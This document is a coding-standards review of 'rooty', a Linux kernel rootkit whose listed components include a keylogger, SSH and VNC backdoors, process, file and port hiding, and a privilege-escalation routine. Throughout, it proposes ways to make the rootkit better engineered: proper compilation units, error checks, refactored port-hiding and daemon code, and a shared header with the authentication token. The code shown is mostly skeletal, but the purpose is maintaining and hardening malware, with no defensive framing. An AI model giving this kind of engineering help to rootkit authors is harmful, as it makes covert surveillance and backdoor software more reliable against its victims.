# Coding Standards and Style Improvements

Recommendations for bringing the codebase in line with Linux kernel coding standards and C project best practices.

---

## 1. Project Structure

### Current Problem
All kernel module logic is implemented in header files (`.h`), with `rooty.c` only performing initialization. This is a fundamental architectural antipattern — headers should declare interfaces, not define implementations.

### Recommendation
Restructure into proper compilation units:

```
rooty/
├── include/
│   ├── rooty.h              # Shared types, constants, forward declarations
│   ├── rooty_hook.h         # Hook infrastructure declarations
│   ├── rooty_hide.h         # Process/file hiding declarations
│   ├── rooty_net.h          # Network hiding declarations
│   ├── rooty_keylog.h       # Keylogger declarations
│   ├── rooty_ssh.h          # SSH backdoor declarations
│   └── rooty_ioctl.h        # IOCTL interface declarations
├── src/
│   ├── rooty_main.c         # Module init/exit
│   ├── rooty_hook.c         # Hooking infrastructure
│   ├── rooty_hide.c         # Process/file hiding
│   ├── rooty_net.c          # Network hiding
│   ├── rooty_keylog.c       # Keylogger
│   ├── rooty_ssh.c          # SSH backdoor
│   └── rooty_ioctl.c        # IOCTL handler
├── common/
│   └── rooty_common.h       # Shared structs (rooty_args, etc.)
├── tools/
│   ├── ioctl/
│   ├── sshd/
│   └── vncd/
├── Makefile
└── Kbuild
```

### Include Guards

**Every** header file must have include guards. Currently none of the 8 headers have them.

```c
#ifndef ROOTY_HOOK_H
#define ROOTY_HOOK_H

/* declarations */

#endif /* ROOTY_HOOK_H */
```

---

## 2. Linux Kernel Coding Style Compliance

The project should follow the [Linux kernel coding style](https://www.kernel.org/doc/html/latest/process/coding-style.html). Key violations:

### Naming Conventions
- **Functions:** Use `snake_case` prefixed with module name. Current code mixes styles.
  - `root_me()` → `rooty_escalate_privileges()`
  - `hide_file()` → `rooty_hide_file()`
  - `n_proc_iterate()` → `rooty_proc_iterate_hook()`
- **Macros:** Use `UPPER_SNAKE_CASE` (mostly followed already)
- **Structs:** Use `snake_case` (e.g., `struct rooty_hook`, not `struct sym_hook`)

### Magic Numbers
Replace all magic numbers with named constants:

```c
/* Current */
case 0:  root_me(); break;
case 1:  hide_proc(args.pid); break;

/* Improved */
enum rooty_cmd {
    ROOTY_CMD_ROOT       = 0,
    ROOTY_CMD_HIDE_PROC  = 1,
    ROOTY_CMD_SHOW_PROC  = 2,
    ROOTY_CMD_HIDE_TCP4  = 3,
    /* ... */
};

case ROOTY_CMD_ROOT:      rooty_escalate(); break;
case ROOTY_CMD_HIDE_PROC: rooty_hide_proc(args.pid); break;
```

### Global Variables
- Mark all file-scoped variables `static`
- Mark read-only data `const`
- Prefix globals with module name to avoid namespace pollution
- `keymap.h` arrays should be `static const`

### Function Visibility
- Mark functions not needed outside the file as `static`
- Non-static functions defined in headers cause linker errors with multiple TUs

---

## 3. Error Handling

### Current State
Most functions ignore errors or handle them incorrectly. Critical operations like `kmalloc`, `filp_open`, `kthread_create`, and `copy_from_user` are frequently used without checking return values.

### Recommendations

1. **Always check `kmalloc` returns:**
```c
ptr = kmalloc(size, GFP_KERNEL);
if (!ptr)
    return -ENOMEM;
```

2. **Always check `filp_open` with `IS_ERR`:**
```c
struct file *f = filp_open(path, flags, mode);
if (IS_ERR(f))
    return PTR_ERR(f);
```

3. **Check `copy_from_user` and return `-EFAULT`:**
```c
if (copy_from_user(&args, uptr, sizeof(args)))
    return -EFAULT;
```

4. **Check `kthread_create` returns:**
```c
task = kthread_create(fn, data, "name");
if (IS_ERR(task))
    return PTR_ERR(task);
```

5. **Implement cleanup-on-error (goto pattern)** for `rooty_init()`:
```c
int rooty_init(void)
{
    ret = init_hooks();
    if (ret)
        return ret;

    ret = init_keylogger();
    if (ret)
        goto err_hooks;

    ret = init_ssh();
    if (ret)
        goto err_keylogger;

    return 0;

err_keylogger:
    stop_keylogger();
err_hooks:
    cleanup_hooks();
    return ret;
}
```

---

## 4. Code Duplication

### Socket Hiding
`hide_tcp4_port`, `hide_tcp6_port`, `hide_udp4_port`, `hide_udp6_port` (and their `unhide_*` counterparts and `n_*_seq_show` hooks) are nearly identical. Refactor into a single parameterized implementation:

```c
struct port_hide_list {
    struct list_head list;
    spinlock_t lock;
    const char *proc_path;
};

static int rooty_hide_port(struct port_hide_list *plist, unsigned short port);
static int rooty_unhide_port(struct port_hide_list *plist, unsigned short port);
static int rooty_port_seq_show(struct port_hide_list *plist, 
                                struct seq_file *seq, void *v);
```

### VNC and SSH Daemon Management
`ssh.h` and `vnc.h` contain nearly duplicate code for starting/stopping userspace daemons, sending signals, and managing PIDs. Extract a common `rooty_daemon` abstraction:

```c
struct rooty_daemon {
    const char *path;
    const char **argv;
    const char **envp;
    pid_t pid;
    int is_running;
    spinlock_t lock;
};

int rooty_daemon_start(struct rooty_daemon *d);
int rooty_daemon_stop(struct rooty_daemon *d);
```

### Shared Structs Across Kernel/Userspace
`struct rooty_args`, `struct rooty_proc_args`, `struct rooty_port_args`, `struct rooty_file_args`, and `AUTH_TOKEN` are copy-pasted into `ioctl.h`, `ioctl/ioctl.c`, `sshd/sshd.c`, and `vncd/vnc-server.c`. Create a single shared header:

```c
/* common/rooty_uapi.h — shared kernel/userspace definitions */
#ifndef ROOTY_UAPI_H
#define ROOTY_UAPI_H

#define ROOTY_AUTH_TOKEN 0xDEADC0DE

struct rooty_args { /* ... */ };
struct rooty_proc_args { /* ... */ };
struct rooty_port_args { /* ... */ };
struct rooty_file_args { /* ... */ };

#endif
```

---

## 5. Documentation

### Missing Documentation
- No function-level comments explaining purpose, parameters, or return values
- No module-level documentation block
- No architecture decision records
- No README in subdirectories

### Recommended Additions
- Add kernel-doc formatted comments for all public functions:
```c
/**
 * rooty_hide_proc - Hide a process from /proc listing
 * @pid: PID of the process to hide
 *
 * Adds the given PID to the hidden process list.
 * The process will not appear in /proc readdir results.
 *
 * Return: 0 on success, -ENOMEM on allocation failure
 */
int rooty_hide_proc(pid_t pid);
```

---

## 6. Miscellaneous Style Issues

| Issue | Location | Fix |
|---|---|---|
| Parameter named `new` (C++ keyword) | `syscall_table.h` | Rename to `new_fn` or `target` |
| Parameter named `str` shadows builtin | `ping.py` | Rename to `data` or `msg` |
| `(1==1)` for boolean true | `vncd/vnc-server.c` | Use `1` or `true` |
| `PICTURE_TIMEOUT (1.0/1.0)` | `vncd/vnc-server.c` | Use `1.0` directly |
| Hardcoded username `"jermey"` | `vnc.h` | Make configurable |
| Typo "privilages" | `ioctl/ioctl.c` | "privileges" |
| Typo "cleint" | `sshd/sshd.c` | "client" |
| Duplicate `#include <stdio.h>` | `ioctl/ioctl.c` | Remove duplicate |
| Mixed tabs and spaces | `vncd/vnc-server.c` | Use consistent indentation (tabs per kernel style) |
